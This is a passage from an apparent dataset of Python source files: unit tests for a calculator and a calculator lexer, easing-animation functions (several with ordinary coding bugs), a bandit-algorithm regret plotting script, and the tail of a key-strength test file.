paramStrength(2**6144))\n\n    def test_7680(self):\n        self.assertEqual(192, paramStrength(2**7680))\n\n    def test_8192(self):\n        self.assertEqual(192, paramStrength(2**8192))\n\n    def test_15360(self):\n        self.assertEqual(256, paramStrength(2**15360))\n", "500": "# the naming convention is to write test_nameOfModule when making test\r\n# https://docs.python.org/3/library/unittest.html\r\n\r\nimport unittest\r\nimport calc\r\n\r\n\r\nclass TestCase(unittest.TestCase):\r\n\r\n    # name of method should start with test_\r\n    def test_add(self):\r\n        result = calc.add(10, 5)\r\n        self.assertEqual(result, 15)\r\n        self.assertEqual(calc.add(10, -5), 5)\r\n        self.assertEqual(calc.add(5, 0), 5)\r\n        self.assertEqual(calc.add(-1, -3), -4)\r\n\r\n    def test_multiply(self):\r\n        self.assertEqual(calc.multiply(10, -5), -50)\r\n        self.assertEqual(calc.multiply(5, 0), 0)\r\n        self.assertEqual(calc.multiply(1, 3), 3)\r\n\r\n    def test_divide(self):\r\n        self.assertEqual(calc.divide(10, -5), -2)\r\n        self.assertEqual(calc.divide(5, 1), 5)\r\n        self.assertEqual(calc.divide(-3, -1), 3)\r\n        self.assertEqual(calc.divide(5, 2), 2.5)\r\n\r\n        self.assertRaises(ValueError, calc.divide, 10, 0)\r\n\r\n        with self.assertRaises(ValueError):\r\n            calc.divide(3, 0)\r\n\r\n    def test_subtract(self):\r\n        self.assertEqual(calc.subtract(10, -5), 15)\r\n        self.assertEqual(calc.subtract(5, 0), 5)\r\n        self.assertEqual(calc.subtract(-1, -3), 2)\r\n\r\n\r\nif __name__ == '__main__':\r\n    unittest.main()\r\n\r\n\r\n\r\n\r\n\r\n", "501": "from math import sin, cos, pi, sqrt\n\ndef check_exceptions(calc, change_in_value, start_value):\n# Check if the value is increasing over time\n    if change_in_value > start_value: \n        if calc > (change_in_value + start_value):\n            # print(\"triggerd increase exception\")\n            return change_in_value + start_value\n    # else check if the value is decreasing over time\n    elif change_in_value < start_value: \n        # print(\"change in value\",change_in_value, \"start_value\", start_value)\n        if calc < (change_in_value + start_value):\n            # print(\"triggerd decrease exception\")\n            return change_in_value + start_value\n    return calc\n\ndef check_duration(calc, current_time, duration, start_time, target_angle):\n    # print(\"check_time \", current_time, \"duration\", duration, 'start time', start_time, \"target_angle\", target_angle, \"calc\", calc)\n    if current_time > duration:\n        # print(\"duration exception triggered\")\n        return target_angle\n    return calc\n\nclass Transition():\n    def linear_tween(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" simple linear tweening - no easing, no acceleration \"\"\"\n        calc = ((change_in_value * current_time) / duration) + start_value\n        \n        calc = check_exceptions(calc, change_in_value, start_value)\n        calc = check_duration(calc, current_time, duration, start_time, target_angle)\n        return int(calc)\n\n    def ease_in_quad(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" quadratic easing in - accelerating from zero velocity \"\"\"\n        current_time /= duration\n        calc = change_in_value * current_time * current_time + start_value\n        calc = check_exceptions(calc, change_in_value, start_value)\n        calc = check_duration(calc, current_time, duration, start_time, target_angle)\n        return int(calc)\n\n    def ease_out_quad(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" quadratic easing out - decelerating to zero velocity \"\"\"\n        cur_time = current_time\n        current_time /= duration\n        calc = ((1-change_in_value * current_time) * (current_time-2)) + start_value\n\n        calc = check_exceptions(calc, change_in_value, start_value)\n        calc = check_duration(calc, cur_time, duration, start_time, target_angle)\n        return int(calc)\n\n    def ease_in_out_quad(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" quadratic easing in/out - acceleration until halfway, then deceleration \"\"\"\n        cur_time = current_time\n        current_time /= duration/2\n        if (current_time < 1):\n            return change_in_value/2*current_time*current_time + start_value\n        current_time -=1\n        calc = (((1-current_time)/2 )* (current_time*(current_time-2)-1)) + start_value\n        calc = check_exceptions(calc, change_in_value, start_value)\n        calc = check_duration(calc, cur_time, duration, start_time, target_angle)\n        return int(calc)\n\n    def ease_in_cubic(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" cubic easing in - accelerating from zero velocity \"\"\"\n        current_time /= duration\n        calc = change_in_value*current_time*current_time*current_time + start_value\n        return int(calc)\n\n    def ease_out_cubic(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" cubic easing out - decelerating to zero velocity \"\"\"\n        current_time /= duration\n        current_time -=1\n        calc = change_in_value(current_time*current_time*current_time+1)+start_value\n        return int(calc)\n\n    def ease_in_out_cubic(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" cubic easing in/out - acceleration until halfway, then deceleration \"\"\"\n        current_time /= duration/2\n        if (current_time < 1):\n            return change_in_value/2*current_time*current_time*current_time + start_value\n        current_time -= 2\n        calc = change_in_value/2 * (current_time*current_time*current_time + 2) + start_value\n        return int(calc)\n\n    def ease_in_quart(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" quartic easing in - accelerating from zero velocity \"\"\"\n        current_time /= duration\n        calc = change_in_value * current_time * current_time * current_time * current_time + start_value\n        return int(calc)\n\n    def ease_out_quart(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" quartic easing out - decelerating to zero velocity \"\"\"\n        current_time /= duration\n        current_time =-1\n        calc = 1-change_in_value * (current_time*current_time*current_time*current_time - 1) + start_value\n        return int(calc)\n\n    def ease_in_out_quart(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" quartic easing in/out - acceleration until halfway, then deceleration \"\"\"\n        current_time /= duration/2\n        if (current_time < 1):\n            return change_in_value /2 * current_time * current_time * current_time* current_time + start_value\n        current_time -= 2\n        calc = 1-change_in_value/2 * (current_time * current_time * current_time * current_time -2) + start_value\n        return int(calc)\n\n    def ease_in_quint(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" quintic easing in - accelerating from zero velocity \"\"\"\n        current_time /= duration\n        calc = change_in_value * current_time * current_time * current_time * current_time * current_time + start_value\n        return int(calc)\n\n    def ease_out_quint(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" quintic easing out - decelerating to zero velocity \"\"\"\n        current_time = current_time / duration\n        current_time -= 1\n        calc = change_in_value(current_time*current_time*current_time*current_time*current_time + 1) + start_value\n        return int(calc)\n\n    def ease_in_out_quint(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" quintic easing in/out - acceleration until halfway, then deceleration \"\"\"\n        current_time /= duration / 2\n        if (current_time < 1):\n            return change_in_value / 2 * current_time * current_time * current_time * current_time * current_time + start_value\n        current_time -= 2\n        calc = change_in_value /2 * (current_time * current_time * current_time * current_time * current_time + 2) + start_value\n        return int(calc)\n\n    def ease_in_sine(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" sinusoidal easing in - accelerating from zero velocity \"\"\"\n        calc = 1-change_in_value * cos(current_time / duration * (pi/2)) + change_in_value + start_value\n        return int(calc)\n\n    def ease_out_sine(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" sinusoidal easing out - decelerating to zero velocity \"\"\"\n        calc = change_in_value * sin(current_time / duration * (pi/2)) + start_value\n        return int(calc)\n\n    def ease_in_out_sine(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" sinusoidal easing in/out - accelerating until halfway, then decelerating \"\"\"\n        calc = 1-change_in_value/2 * (cos(pi*current_time/duration) - 1) + start_value\n        return int(calc)\n\n    def ease_in_expo(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" exponential easing in - accelerating from zero velocity \"\"\"\n        calc = current_time * pow(2, 10 * (current_time / duration - 1)) + start_value\n        return int(calc)\n\n    def ease_out_expo(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" exponential easing out - decelerating to zero velocity \"\"\"\n        calc = change_in_value * (pow (2, -10 * current_time / duration) + 1) + start_value\n        return int(calc)\n\n    def ease_in_out_expo(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" exponential easing in/out - accelerating until halfway, then decelerating \"\"\"\n        current_time /= duration/2\n        if(current_time < 1):\n            calc = change_in_value/2 * pow(2, 10 * (current_time -1)) + start_value\n            return int(calc)\n        current_time -= 1\n        calc = change_in_value/2 * (pow(2, -10 * current_time) + 2) + start_value\n        return int(calc)\n\n    def ease_in_circ(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" circular easing in - accelerating from zero velocity \"\"\"\n        current_time /= duration\n        calc = 1-change_in_value * (sqrt(1 - current_time*current_time) - 1) + start_value\n        return int(calc)\n\n    def ease_out_circ(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" circular easing out - decelerating to zero velocity \"\"\"\n        current_time /= duration\n        current_time -= 1\n        calc = change_in_value * sqrt(1 - current_time*current_time) + start_value\n        return int(calc)\n\n    def ease_in_out_circ(self, current_time, start_value, change_in_value, duration, start_time, target_angle):\n        \"\"\" circular easing in/out - acceleration until halfway, then deceleration \"\"\"\n        current_time /= duration/2\n        if (current_time < 1):\n            calc = 1-change_in_value/2 * (sqrt(1 - current_time-current_time) -1) + start_value\n            return int(calc)\n        current_time -= 2\n        calc = change_in_value / 2 * (sqrt(1 - current_time*current_time) + 1) + start_value\n        return int(calc)\n", "502": "import numpy as np \r\nfrom matplotlib import pyplot as plt \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\ninstance1 = [0.4,0.8]\r\ninstance2 = [0.4,0.3,0.5,0.2,0.1]\r\ninstance3 = [0.15,0.23,0.37,0.44,0.50,0.32,0.78,0.21,0.82,0.56,0.34,0.56,0.84,0.76,0.43,0.65,0.73,0.92,0.10,0.89,0.48,0.96,0.60,0.54,0.49]\r\n\r\n\r\nmax1 = max(instance1)\r\nprint(max1)\r\nmax2 = max(instance2)\r\nmax3 = max(instance3)\r\nprint(max3)\r\n\r\n\r\nucb1 = np.loadtxt('ucb_1.txt')\r\nepsilon1 = np.loadtxt('epsilon_1.txt')\r\nkl_ucb1 = np.loadtxt('kl_ucb_1.txt')\r\nthompson1 = np.loadtxt('thompson_1.txt')\r\n\r\n# Reget_calc = np.zeros(1600)\r\n# horizons = np.zeros(1600)\r\n# i = 0 \r\n\r\n# while i< 1600:\r\n#     Reget_calc[i] = (i+1)*max1\r\n#     horizons[i] = i+1\r\n#     i = i+1\r\n\r\n# Reget_calc = Reget_calc-epsilon1\r\n\r\n\r\n# plt.label(\"UCB\") \r\n# # plt.subplot(1,3,1)\r\n# plt.xlabel(\"Horizon\") \r\n# plt.ylabel(\"Average regret\") \r\n# print(len(Reget_calc))\r\n# plt.plot(np.log10(horizons),np.log10(Reget_calc),label= 'Epsilon Greedy') \r\n# # plt.show()\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n# Reget_calc = np.zeros(1600)\r\n# horizons = np.zeros(1600)\r\n# i = 0 \r\n\r\n# while i< 1600:\r\n#     Reget_calc[i] = (i+1)*max1\r\n#     horizons[i] = i+1\r\n#     i = i+1\r\n\r\n# np.savetxt('testing.txt',Reget_calc)  \r\n# Reget_calc = Reget_calc-ucb1\r\n# # np.savetxt('testing.txt',thompson1)  \r\n\r\n\r\n# plt.title(\"Instance 1\") \r\n# plt.xlabel(\"Horizon\") \r\n# plt.ylabel(\"Average regret\") \r\n# plt.plot(np.log10(horizons),np.log10(Reget_calc),label = 'UCB')\r\n# # plt.legend() \r\n\r\n\r\n\r\n# Reget_calc = np.zeros(1600)\r\n# horizons = np.zeros(1600)\r\n# i = 0 \r\n\r\n# while i< 1600:\r\n#     Reget_calc[i] = (i+1)*max1\r\n#     horizons[i] = i+1\r\n#     i = i+1\r\n\r\n# np.savetxt('testing.txt',Reget_calc)  \r\n# Reget_calc = Reget_calc-kl_ucb1\r\n# # np.savetxt('testing.txt',thompson1)  \r\n\r\n\r\n# plt.title(\"Instance 1\") \r\n# plt.xlabel(\"Horizon\") \r\n# plt.ylabel(\"Average regret\") \r\n# plt.plot(np.log10(horizons),np.log10(Reget_calc),label = 'KL UCB')\r\n# plt.legend() \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n# Reget_calc = np.zeros(1600)\r\n# horizons = np.zeros(1600)\r\n# i = 0 \r\n\r\n# while i< 1600:\r\n#     Reget_calc[i] = (i+1)*max1\r\n#     horizons[i] = i+1\r\n#     i = i+1\r\n\r\n# Reget_calc = Reget_calc-thompson1\r\n\r\n\r\n# # plt.label(\"UCB\") \r\n# # plt.subplot(1,3,2)\r\n# plt.xlabel(\"Horizon (log scale base-10)\") \r\n# plt.ylabel(\"Average regret (log scale base-10) \") \r\n# print(len(Reget_calc))\r\n# plt.plot(np.log10(horizons),np.log10(Reget_calc),label= 'Thompson Sampling') \r\n# # plt.show()\r\n\r\n# plt.legend() \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n# ucb1 = np.loadtxt('ucb_2.txt')\r\n# epsilon1 = np.loadtxt('epsilon_2.txt')\r\n# kl_ucb1 = np.loadtxt('kl_ucb_2.txt')\r\n# thompson1 = np.loadtxt('thompson_2.txt')\r\n\r\n\r\n\r\n\r\n\r\n# Reget_calc = np.zeros(1600)\r\n# horizons = np.zeros(1600)\r\n# i = 0 \r\n\r\n# while i< 1600:\r\n#     Reget_calc[i] = (i+1)*max2\r\n#     horizons[i] = i+1\r\n#     i = i+1\r\n\r\n# Reget_calc = Reget_calc-epsilon1\r\n\r\n\r\n# # plt.label(\"UCB\") \r\n# # plt.subplot(1,3,2)\r\n# plt.xlabel(\"Horizon\") \r\n# plt.ylabel(\"Average regret\") \r\n# print(len(Reget_calc))\r\n# plt.plot(np.log10(horizons),np.log10(Reget_calc),label= 'Epsilon Greedy') \r\n# # plt.show()\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n# Reget_calc = np.zeros(1600)\r\n# horizons = np.zeros(1600)\r\n# i = 0 \r\n\r\n# while i< 1600:\r\n#     Reget_calc[i] = (i+1)*max2\r\n#     horizons[i] = i+1\r\n#     i = i+1\r\n\r\n# np.savetxt('testing.txt',Reget_calc)  \r\n# Reget_calc = Reget_calc-ucb1\r\n# # np.savetxt('testing.txt',thompson1)  \r\n\r\n\r\n# plt.title(\"Instance 1\") \r\n# plt.xlabel(\"Horizon\") \r\n# plt.ylabel(\"Average regret\") \r\n# plt.plot(np.log10(horizons),np.log10(Reget_calc),label = 'UCB')\r\n# plt.legend() \r\n\r\n\r\n\r\n# Reget_calc = np.zeros(1600)\r\n# horizons = np.zeros(1600)\r\n# i = 0 \r\n\r\n# while i< 1600:\r\n#     Reget_calc[i] = (i+1)*max2\r\n#     horizons[i] = i+1\r\n#     i = i+1\r\n\r\n# np.savetxt('testing.txt',Reget_calc)  \r\n# Reget_calc = Reget_calc-kl_ucb1\r\n# # np.savetxt('testing.txt',thompson1)  \r\n\r\n\r\n# plt.title(\"Instance 2\") \r\n# plt.xlabel(\"Horizon\") \r\n# plt.ylabel(\"Average regret\") \r\n# plt.plot(np.log10(horizons),np.log10(Reget_calc),label = 'KL UCB')\r\n# # plt.legend() \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n# Reget_calc = np.zeros(1600)\r\n# horizons = np.zeros(1600)\r\n# i = 0 \r\n\r\n# while i< 1600:\r\n#     Reget_calc[i] = (i+1)*max2\r\n#     horizons[i] = i+1\r\n#     i = i+1\r\n\r\n# Reget_calc = Reget_calc-thompson1\r\n\r\n\r\n# plt.xlabel(\"Horizon (log scale base-10)\") \r\n# plt.ylabel(\"Average regret (log scale base-10) \") \r\n# print(len(Reget_calc))\r\n# plt.plot(np.log10(horizons),np.log10(Reget_calc),label= 'Thompson Sampling') \r\n# # plt.show()\r\n# plt.legend() \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n# ucb1 = np.loadtxt('ucb_3.txt')\r\n# epsilon1 = np.loadtxt('epsilon_3.txt')\r\n\r\n\r\n\r\n\r\n\r\n# Reget_calc = np.zeros(1600)\r\n# horizons = np.zeros(1600)\r\n# i = 0 \r\n\r\n# while i< 1600:\r\n#     Reget_calc[i] = (i+1)*max3\r\n#     horizons[i] = i+1\r\n#     i = i+1\r\n\r\n# Reget_calc = Reget_calc-epsilon1\r\n\r\n\r\n# # plt.label(\"UCB\") \r\n# # plt.subplot(1,3,3)\r\n# plt.xlabel(\"Horizon\") \r\n# plt.ylabel(\"Average regret\") \r\n# print(len(Reget_calc))\r\n# plt.plot(np.log10(horizons),np.log10(Reget_calc),label= 'Epsilon Greedy') \r\n# # plt.show()\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n# Reget_calc = np.zeros(1600)\r\n# horizons = np.zeros(1600)\r\n# i = 0 \r\n\r\n# while i< 1600:\r\n#     Reget_calc[i] = (i+1)*max3\r\n#     horizons[i] = i+1\r\n#     i = i+1\r\n\r\n# np.savetxt('testing.txt',Reget_calc)  \r\n# Reget_calc = Reget_calc-ucb1\r\n# # np.savetxt('testing.txt',thompson1)  \r\n\r\n\r\n# plt.title(\"Instance 1\") \r\n# plt.xlabel(\"Horizon\") \r\n# plt.ylabel(\"Average regret\") \r\n# plt.plot(np.log10(horizons),np.log10(Reget_calc),label = 'UCB')\r\n# plt.legend() \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nkl_ucb1 = np.loadtxt('thompson_with_hint_1_1_test.txt')\r\nthompson1 = np.loadtxt('thompson_orig_1_1_test.txt')\r\nReget_calc = np.zeros(1600)\r\nhorizons = np.zeros(1600)\r\ni = 0 \r\n\r\nwhile i< 1600:\r\n    Reget_calc[i] = (i+1)*max1\r\n    horizons[i] = i+1\r\n    i = i+1\r\n\r\nnp.savetxt('testing.txt',Reget_calc)  \r\nReget_calc = Reget_calc-kl_ucb1\r\n# np.savetxt('testing.txt',thompson1)  \r\n\r\nplt.subplot(1,3,1)\r\nplt.title(\"Instance 1\") \r\nplt.xlabel(\"Horizon\") \r\nplt.ylabel(\"Average regret\") \r\nplt.plot(horizons,Reget_calc,label = 'Thompson Sampling with hint')\r\n# plt.legend() \r\n\r\n\r\n\r\n\r\n\r\nReget_calc = np.zeros(1600)\r\nhorizons = np.zeros(1600)\r\ni = 0 \r\n\r\nwhile i< 1600:\r\n    Reget_calc[i] = (i+1)*max1\r\n    horizons[i] = i+1\r\n    i = i+1\r\n\r\nReget_calc = Reget_calc-thompson1\r\n\r\n\r\n# plt.label(\"UCB\") \r\n# plt.subplot(1,3,2)\r\nplt.xlabel(\"Horizon \") \r\nplt.ylabel(\"Average regret \") \r\nprint(len(Reget_calc))\r\nplt.plot(horizons,Reget_calc,label= 'Thompson Sampling') \r\n# plt.show()\r\nplt.legend() \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nkl_ucb1 = np.loadtxt('thompson_with_hint_2_2_test.txt')\r\nthompson1 = np.loadtxt('thompson_orig_2_2_test.txt')\r\nReget_calc = np.zeros(1600)\r\nhorizons = np.zeros(1600)\r\ni = 0 \r\n\r\nwhile i< 1600:\r\n    Reget_calc[i] = (i+1)*max2\r\n    horizons[i] = i+1\r\n    i = i+1\r\n\r\nnp.savetxt('testing.txt',Reget_calc)  \r\nReget_calc = Reget_calc-kl_ucb1\r\n# np.savetxt('testing.txt',thompson1)  \r\n\r\nplt.subplot(1,3,2)\r\nplt.title(\"Instance 2\") \r\nplt.xlabel(\"Horizon\") \r\nplt.ylabel(\"Average regret\") \r\nplt.plot(horizons,Reget_calc,label = 'Thompson Sampling with hint')\r\n# plt.legend() \r\n\r\n\r\n\r\n\r\n\r\nReget_calc = np.zeros(1600)\r\nhorizons = np.zeros(1600)\r\ni = 0 \r\n\r\nwhile i< 1600:\r\n    Reget_calc[i] = (i+1)*max2\r\n    horizons[i] = i+1\r\n    i = i+1\r\n\r\nReget_calc = Reget_calc-thompson1\r\n\r\n\r\n# plt.label(\"UCB\") \r\n# plt.subplot(1,3,2)\r\nplt.xlabel(\"Horizon \") \r\nplt.ylabel(\"Average regret \") \r\nprint(len(Reget_calc))\r\nplt.plot(horizons,Reget_calc,label= 'Thompson Sampling') \r\n# plt.show()\r\nplt.legend() \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nkl_ucb1 = np.loadtxt('thompson_with_hint_3_3_test.txt')\r\nthompson1 = np.loadtxt('thompson_orig_3_3_test.txt')\r\nReget_calc = np.zeros(1600)\r\nhorizons = np.zeros(1600)\r\ni = 0 \r\n\r\nwhile i< 1600:\r\n    Reget_calc[i] = (i+1)*max3\r\n    horizons[i] = i+1\r\n    i = i+1\r\n\r\nnp.savetxt('testing.txt',Reget_calc)  \r\nReget_calc = Reget_calc-kl_ucb1\r\n# np.savetxt('testing.txt',thompson1)  \r\nplt.subplot(1,3,3)\r\n\r\nplt.title(\"Instance 3\") \r\nplt.xlabel(\"Horizon\") \r\nplt.ylabel(\"Average regret\") \r\nplt.plot(horizons,Reget_calc,label = 'Thompson Sampling with hint')\r\n# plt.legend() \r\n\r\n\r\n\r\n\r\n\r\nReget_calc = np.zeros(1600)\r\nhorizons = np.zeros(1600)\r\ni = 0 \r\n\r\nwhile i< 1600:\r\n    Reget_calc[i] = (i+1)*max3\r\n    horizons[i] = i+1\r\n    i = i+1\r\n\r\nReget_calc = Reget_calc-thompson1\r\n\r\n\r\n# plt.label(\"UCB\") \r\n# plt.subplot(1,3,2)\r\nplt.xlabel(\"Horizon \") \r\nplt.ylabel(\"Average regret \") \r\nprint(len(Reget_calc))\r\nplt.plot(horizons,Reget_calc,label= 'Thompson Sampling') \r\n# plt.show()\r\nplt.legend() \r\n\r\n\r\nplt.show()\r\n\r\n\r\n\r\n\r\n", "503": "import unittest\nimport swisscalc\nimport math\n\nclass LexTest(unittest.TestCase):\n    def test_dec(self):\n        calc = swisscalc.Calc()\n        tok = calc._lexme('1234')[0]\n        self.assertEqual(tok.type, 'decint')\n        self.assertEqual(tok.value, 1234)\n\n        tok = calc._lexme('01234')[0]\n        self.assertNotEqual(tok.type, 'decint')\n\n        tok = calc._lexme('0')[0]\n        self.assertEqual(tok.type, 'decint')\n        self.assertEqual(tok.value, 0)\n\n        tok = calc._lexme('123af')[0]\n        self.assertEqual(tok.type, 'decint')\n        self.assertEqual(tok.value, 123)\n\n    def test_bin(self):\n        calc = swisscalc.Calc()\n        tok = calc._lexme('0b11')[0]\n        self.assertEqual(tok.type, 'binint')\n        self.assertEqual(tok.value, 0b11)\n\n        tok = calc._lexme('0B11')[0]\n        self.assertEqual(tok.type, 'binint')\n        self.assertEqual(tok.value, 0B11)\n\n        tok = calc._lexme('0b132')[0]\n        self.assertEqual(tok.type, 'binint')\n        self.assertEqual(tok.value, 0b1)\n\n    def test_oct(self):\n        calc = swisscalc.Calc()\n        tok = calc._lexme('0123')[0]\n        self.assertEqual(tok.type, 'octint')\n        self.assertEqual(tok.value, 0123)\n\n        tok = calc._lexme('0o123')[0]\n        self.assertEqual(tok.type, 'octint')\n        self.assertEqual(tok.value, 0o123)\n\n        tok = calc._lexme('0O123')[0]\n        self.assertEqual(tok.type, 'octint')\n        self.assertEqual(tok.value, 0O123)\n\n        tok = calc._lexme('0789')[0]\n        self.assertEqual(tok.type, 'octint')\n        self.assertEqual(tok.value, 07)\n\n    def test_hex(self):\n        calc = swisscalc.Calc()\n        tok = calc._lexme('0x123')[0]\n        self.assertEqual(tok.type, 'hexint')\n        self.assertEqual(tok.value, 0x123)\n\n        tok = calc._lexme('0X123')[0]\n        self.assertEqual(tok.type, 'hexint')\n        self.assertEqual(tok.value, 0X123)\n\n        tok = calc._lexme('0xdeadbeefhaha')[0]\n        self.assertEqual(tok.type, 'hexint')\n        self.assertEqual(tok.value, 0xdeadbeef)\n\n    def test_string(self):\n        calc = swisscalc.Calc()\n\n        tok = calc._lexme(r\"\"\"'hello'\"\"\")[0]\n        self.assertEqual(tok.type, 'string')\n        self.assertEqual(tok.value, 'hello')\n\n        tok = calc._lexme(r'\"world\"')[0]\n        self.assertEqual(tok.type, 'string')\n        self.assertEqual(tok.value, \"world\")\n\n        tok = calc._lexme(r\"\"\"'\\'\\n'\"\"\")[0]\n        self.assertEqual(tok.type, 'string')\n        self.assertEqual(tok.value, '\\'\\n')\n\n        tok = calc._lexme(r\"\"\"r'\\'\\n'\"\"\")[0]\n        self.assertEqual(tok.type, 'string')\n        self.assertEqual(tok.value, r'\\'\\n')\n\n        tok = calc._lexme(r\"\"\"R'\\'\\n'\"\"\")[0]\n        self.assertEqual(tok.type, 'string')\n        self.assertEqual(tok.value, R'\\'\\n')\n\n        tok = calc._lexme(r'\"\\\"\\n\"')[0]\n        self.assertEqual(tok.type, 'string')\n        self.assertEqual(tok.value, \"\\\"\\n\")\n\n    def test_pointfloat(self):\n        calc = swisscalc.Calc()\n        tok = calc._lexme('3.14')[0]\n        self.assertEqual(tok.type, 'pointfloat')\n        self.assertEqual(tok.value, 3.14)\n\n        tok = calc._lexme('0.0001')[0]\n        self.assertEqual(tok.type, 'pointfloat')\n        self.assertEqual(tok.value, 0.0001)\n\n        tok = calc._lexme('003.14')[0]\n        self.assertEqual(tok.type, 'pointfloat')\n        self.assertEqual(tok.value, 003.14)\n\n    def test_exponentfloat(self):\n        calc = swisscalc.Calc()\n        tok = calc._lexme('0e0')[0]\n        self.assertEqual(tok.type, 'exponentfloat')\n        self.assertEqual(tok.value, 0e0)\n\n        tok = calc._lexme('3.14e-10')[0]\n        self.assertEqual(tok.type, 'exponentfloat')\n        self.assertEqual(tok.value, 3.14e-10)\n\n        tok = calc._lexme('1.141e+10')[0]\n        self.assertEqual(tok.type, 'exponentfloat')\n        self.assertEqual(tok.value, 1.141e+10)\n\n        tok = calc._lexme('123e123')[0]\n        self.assertEqual(tok.type, 'exponentfloat')\n        self.assertEqual(tok.value, 123e123)\n\n    def test_operator(self):\n        calc = swisscalc.Calc()\n\n        # numeric operator\n\n        tok = calc._lexme('+')[0]\n        self.assertEqual(tok.type, 'add')\n\n        tok = calc._lexme('-')[0]\n        self.assertEqual(tok.type, 'subtract')\n\n        tok = calc._lexme('*')[0]\n        self.assertEqual(tok.type, 'multiply')\n\n        tok = calc._lexme('/')[0]\n        self.assertEqual(tok.type, 'divide')\n\n        tok = calc._lexme('%')[0]\n        self.assertEqual(tok.type, 'modulo')\n\n        tok = calc._lexme('**')[0]\n        self.assertEqual(tok.type, 'power')\n\n        tok = calc._lexme('!')[0]\n        self.assertEqual(tok.type, 'factorial')\n\n        # bit operator\n\n        tok = calc._lexme('<<')[0]\n        self.assertEqual(tok.type, 'lshift')\n\n        tok = calc._lexme('>>')[0]\n        self.assertEqual(tok.type, 'rshift')\n\n        tok = calc._lexme('&')[0]\n        self.assertEqual(tok.type, 'and')\n\n        tok = calc._lexme('~')[0]\n        self.assertEqual(tok.type, 'not')\n\n        tok = calc._lexme('|')[0]\n        self.assertEqual(tok.type, 'or')\n\n        tok = calc._lexme('^')[0]\n        self.assertEqual(tok.type, 'xor')\n\n    def test_delimiter(self):\n        calc = swisscalc.Calc()\n        tok = calc._lexme('=')[0]\n        self.assertEqual(tok.type, 'assign')\n\n        tok = calc._lexme('+=')[0]\n        self.assertEqual(tok.type, 'addassign')\n\n        tok = calc._lexme('-=')[0]\n        self.assertEqual(tok.type, 'subassign')\n\n        tok = calc._lexme('*=')[0]\n        self.assertEqual(tok.type, 'mulassign')\n\n        tok = calc._lexme('/=')[0]\n        self.assertEqual(tok.type, 'divassign')\n\n        tok = calc._lexme('%=')[0]\n        self.assertEqual(tok.type, 'modassign')\n\n        tok = calc._lexme('**=')[0]\n        self.assertEqual(tok.type, 'powassign')\n\n        tok = calc._lexme('<<=')[0]\n        self.assertEqual(tok.type, 'lsftassign')\n\n        tok = calc._lexme('>>=')[0]\n        self.assertEqual(tok.type, 'rsftassign')\n\n        tok = calc._lexme('&=')[0]\n        self.assertEqual(tok.type, 'andassign')\n\n        tok = calc._lexme('|=')[0]\n        self.assertEqual(tok.type, 'orassign')\n\n        tok = calc._lexme('^=')[0]\n        self.assertEqual(tok.type, 'xorassign')\n\n        tok = calc._lexme('(')[0]\n        self.assertEqual(tok.type, 'lparen')\n\n        tok = calc._lexme(')')[0]\n        self.assertEqual(tok.type, 'rparen')\n\n        tok = calc._lexme(',')[0]\n        self.assertEqual(tok.type, 'comma')\n\nclass yacc(unittest.TestCase):\n    def test_binop(self):\n        calc = swisscalc.Calc()\n\n        ans = calc.execute('3 + 2')\n        self.assertEqual(float(ans), 3 + 2)\n\n        ans = calc.execute('3.5 + 1.1')\n        self.assertEqual(float(ans), 3.5 + 1.1)\n\n        ans = calc.execute('3 * 2')\n        self.assertEqual(float(ans), 3 * 2)\n\n        ans = calc.execute('3.5 * 1.1')\n        self.assertEqual(float(ans), 3.5 * 1.1)\n\n        ans = calc.execute('3 / 2')\n        self.assertEqual(float(ans), 3 / 2.0)\n\n        ans = calc.execute('3.5 / 1.1')\n        self.assertEqual(float(ans), 3.5 / 1.1)\n\n        ans = calc.execute('3 % 2')\n        self.assertEqual(float(ans), 3 % 2)\n\n        ans = calc.execute('3.5 % 1.1')\n        self.assertEqual(float(ans), 3.5 % 1.1)\n\n        ans = calc.execute('3 ** 2')\n        self.assertEqual(float(ans), 3 ** 